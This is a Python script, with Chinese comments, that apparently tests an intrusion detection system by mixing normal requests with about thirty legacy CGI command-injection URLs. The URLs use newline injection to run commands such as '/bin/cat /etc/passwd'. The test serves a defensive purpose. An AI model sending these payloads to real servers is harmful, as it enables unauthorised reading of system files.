import requests
import time
import random
import logging
import os

# 配置日志
logging.basicConfig(filename='ids_test.log', level=logging.INFO, format='%(asctime)s - %(message)s')

# 正常请求和攻击请求示例
normal_requests = [
    "http://example.com/?search=hello",
    "http://example.com/?search=test",
    "http://example.com/?page=home",
    "http://example.com/?page=about",
    "http://example.com/?id=1234",
    "http://example.com/?query=example"
]

# Attack requests based on patterns from the patternfile
attack_requests = [
    "http://example.com/whois_raw.cgi?fqdn=%0acat%20/etc/passwd",
    "http://example.com/faxsurvey?/bin/cat%20/etc/passwd",
    "http://example.com/phf?Qalias=x%0a/bin/cat%20/etc/passwd",
    "http://example.com/test-cgi?*%0a/bin/ls%20-al%20/",
    "http://example.com/nph-test-cgi?*%0a/bin/cat%20/etc/passwd",
    "http://example.com/handler?*%0a/bin/cat%20/etc/passwd",
    "http://example.com/Count.cgi?df=/%0a/bin/cat%20/etc/passwd",
    "http://example.com/AnyForm2.pl?*%0a/bin/cat%20/etc/passwd",
    "http://example.com/finger?user=%0a/bin/cat%20/etc/passwd",
    "http://example.com/guestbook.cgi?user=%0a/bin/cat%20/etc/passwd",
    "http://example.com/webdist.cgi?language=1%0a/bin/cat%20/etc/passwd",
    "http://example.com/nph-publish?*%0a/bin/cat%20/etc/passwd",
    "http://example.com/htmlscript?*%0a/bin/cat%20/etc/passwd",
    "http://example.com/ucbmail?*%0a/bin/cat%20/etc/passwd",
    "http://example.com/perlshop.cgi?*%0a/bin/cat%20/etc/passwd",
    "http://example.com/php.cgi?*%0a/bin/cat%20/etc/passwd",
    "http://example.com/textcounter.pl?*%0a/bin/cat%20/etc/passwd",
    "http://example.com/view-source?*%0a/bin/cat%20/etc/passwd",
    "http://example.com/global.cgi?*%0a/bin/cat%20/etc/passwd",
    "http://example.com/statit?*%0a/bin/cat%20/etc/passwd",
    "http://example.com/webgais?*%0a/bin/cat%20/etc/passwd",
    "http://example.com/wguest.exe?*%0a/bin/cat%20/etc/passwd",
    "http://example.com/websendmail?*%0a/bin/cat%20/etc/passwd",
    "http://example.com/webwho?*%0a/bin/cat%20/etc/passwd",
    "http://example.com/w3-msql?*%0a/bin/cat%20/etc/passwd",
    "http://example.com/maillist.pl?*%0a/bin/cat%20/etc/passwd",
    "http://example.com/wrap?*%0a/bin/cat%20/etc/passwd",
    "http://example.com/icat?*%0a/bin/cat%20/etc/passwd",
    "http://example.com/info2www?*%0a/bin/cat%20/etc/passwd",
    "http://example.com/Aglimpse?*%0a/bin/cat%20/etc/passwd",
    "http://example.com/Man.sh?*%0a/bin/cat%20/etc/passwd"
]


def send_request(url):
    try:
        start_time = time.time()
        response = requests.get(url)
        end_time = time.time()
        response_time = end_time - start_time
        logging.info(f"URL: {url}, Status Code: {response.status_code}, Response Time: {response_time:.4f} seconds")
        return response.status_code, response_time
    except requests.RequestException as e:
        logging.error(f"Failed to send request to {url}: {e}")
        return None, None

def main():
    # 清空日志文件
    open('packet_log.txt', 'w').close()

    num_requests = 100
    attack_probability = 0.5  # 50% 概率发送攻击请求
    attack_num = 0
    normal_num = 0
    total_requests = 0


    for _ in range(num_requests):
        is_attack = random.random() < attack_probability
        if is_attack:
            url = random.choice(attack_requests)
            attack_num += 1
        else:
            url = random.choice(normal_requests)
            normal_num += 1

        status_code, response_time = send_request(url)
        if status_code and response_time is not None:
            total_requests += 1

        # 等待一段时间再发送下一个请求，避免服务器过载
        time.sleep(0.5)
        
        
    print("num of attack: " + str(attack_num))
    print("num of normal: " + str(normal_num))


if __name__ == "__main__":
    main()
